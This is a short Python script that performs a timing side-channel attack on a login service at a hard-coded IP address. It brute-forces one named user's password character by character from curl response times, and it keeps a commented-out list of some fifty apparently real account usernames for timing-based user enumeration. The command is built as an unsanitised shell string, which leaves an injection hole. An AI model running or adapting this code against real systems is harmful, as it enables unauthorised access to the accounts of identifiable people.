import subprocess
import time

def execute_command(username, password):
    command = 'curl -d "user={}&password={}" -X POST http://129.65.51.244/login'.format(username, password)
    try:
        subprocess.check_call(command, shell=True)
    except subprocess.CalledProcessError as e:
        print("Error executing the command:", e)

# Replace with your desired username and password
#user_list = ["clupo", "pander14", "hassal", "srbeard", "bellardo", "baburton", "rcanaan", "clements", "bcdasilv", "bdebruhl", "dekhtyar", "eckhardt", "seinakia", "dofang", "hghariby", "javiergs", "amgrow", "bahartma", "phatalsk", "mhaungs", "ihumer", "btjones", "ayaank", "tkearns", "akeen", "bklingen", "foaad", "fkurfess", "ulindqvi", "rmatteso", "amigler", "tmigler", "klmork", "jmukherj", "mukhopad", "pnico", "mpanto01", "dsparkin", "znjp", "apieris", "jplanck", "vcrivera", "mrwebang", "jseng", "dsisodia", "cesiu", "husmith", "lstanche", "jventu09", "kvoelker", "jwang96", "zwood", "jworkman"]
#password = "PasswordHere"
username = "husmith"
lowercase_letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']

# for x in user_list:
#     print(x)
#     t = time.time()
#     execute_command(x, password)
#     print(time.time() - t)
password = ""
while(True):
    max_t = 0
    min_t = 1
    max_char = "a"
    for x in lowercase_letters:
        t = time.time()
        execute_command(username, password + x)
        elapsed = time.time() - t
        print(password + x, elapsed)
        if elapsed > max_t:
            max_t = elapsed
            max_char = x
        if elapsed < min_t:
            min_t = elapsed
    if max_t - min_t < 0.005:
        break

    password = password + max_char
